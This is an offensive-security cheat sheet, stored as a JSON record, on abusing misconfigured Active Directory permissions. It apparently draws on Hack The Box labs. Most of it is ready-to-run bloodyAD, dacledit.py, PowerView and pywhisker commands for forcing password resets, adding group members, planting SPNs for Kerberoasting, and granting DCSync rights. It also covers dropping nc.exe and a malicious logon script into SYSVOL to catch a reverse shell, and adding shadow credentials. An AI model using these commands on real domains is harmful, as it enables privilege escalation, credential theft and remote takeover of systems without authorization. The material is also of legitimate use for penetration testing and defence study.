{"title": "acl-attacks", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-windows-acl-attacks", "html": "<h1 id=\"windows-acl-attacks\">acl-attacks</h1>\n<p>&gt; Abuse misconfigured AD permissions to escalate privileges. Check BloodHound for outbound object control.</p>\n<h3>Common Dangerous ACLs</h3>\n<p>| ACL | What it allows | |-----|---------------| | GenericAll | Full control — change password, modify group membership, set SPN, etc. | | GenericWrite | Write any attribute — scriptPath, msDS-KeyCredentialLink, SPN | | WriteDacl | Modify the object&#x27;s ACL — grant yourself GenericAll | | WriteOwner | Change object owner — then grant yourself WriteDacl | | ForceChangePassword | Reset password without knowing current | | WriteProperty (specific) | Write specific attribute only (e.g., scriptPath, servicePrincipalName) |</p>\n<h3>Tools</h3>\n<h4>bloodyAD</h4>\n<pre><code class=\"language-bash\"># Change password\nbloodyAD --host DC -u user -p pass set password targetUser &#x27;NewPass123!&#x27;\n\n# Add group member\nbloodyAD --host DC -u user -p pass add groupMember &quot;Group Name&quot; targetUser\n\n# Set scriptPath\nbloodyAD --host DC -u user -p pass set object &quot;CN=Target,CN=Users,DC=domain,DC=htb&quot; scriptPath -v script.bat\n\n# Add SPN (for targeted Kerberoasting)\nbloodyAD --host DC -u user -p pass set object &quot;CN=Target,CN=Users,DC=domain,DC=htb&quot; servicePrincipalName -v HTTP/evil.domain.htb</code></pre>\n<h4>dacledit.py</h4>\n<pre><code class=\"language-bash\"># Read ACLs on a target\ndacledit.py -action read -target &#x27;targetUser&#x27; -principal &#x27;attacker&#x27; &#x27;domain/user:pass&#x27; -dc-ip DC_IP\n\n# Grant DCSync rights\ndacledit.py -action write -rights DCSync -principal &#x27;attacker&#x27; -target-dn &#x27;DC=domain,DC=htb&#x27; &#x27;domain/user:pass&#x27; -dc-ip DC_IP</code></pre>\n<h4>PowerView</h4>\n<pre><code class=\"language-powershell\"># Read ACLs\nGet-DomainObjectAcl -Identity targetUser -ResolveGUIDs | ? {$_.SecurityIdentifier -eq &#x27;ATTACKER_SID&#x27;}\n\n# Grant DCSync\nAdd-DomainObjectAcl -TargetIdentity &quot;DC=domain,DC=htb&quot; -PrincipalIdentity attacker -Rights DCSync</code></pre>\n<h3>scriptPath Abuse (from Garfield)</h3>\n<p>When: WriteProperty on Script-Path for user objects.</p>\n<pre><code class=\"language-bash\"># Upload nc.exe + malicious bat to SYSVOL\nsmbclient //DC/SYSVOL -U &#x27;user%pass&#x27; -c &#x27;cd domain.htb\\scripts; put nc.exe; put evil.bat printerDetect.bat&#x27;\n\n# Set target&#x27;s logon script\nbloodyAD --host DC -u user -p pass set object &quot;CN=Target,CN=Users,DC=domain,DC=htb&quot; scriptPath -v printerDetect.bat\n\n# Catch shell when target logs in (simulated RDP)\nnc -lvnp 9001</code></pre>\n<h3>Shadow Credentials</h3>\n<p>When: GenericWrite on a user/computer (write msDS-KeyCredentialLink).</p>\n<pre><code class=\"language-bash\">pywhisker -d domain.htb -u attacker -p pass --target victim --action add -dc-ip DC_IP\n# Then use certipy or PKINITtools to get TGT from the generated certificate</code></pre>", "excerpt": "acl-attacks &gt; Abuse misconfigured AD permissions to escalate privileges. Check BloodHound for outbound object control. Common Dangerous ACLs | ACL | What it allows | |-----|---------------| | Gener…", "tags": ["reference", "windows"]}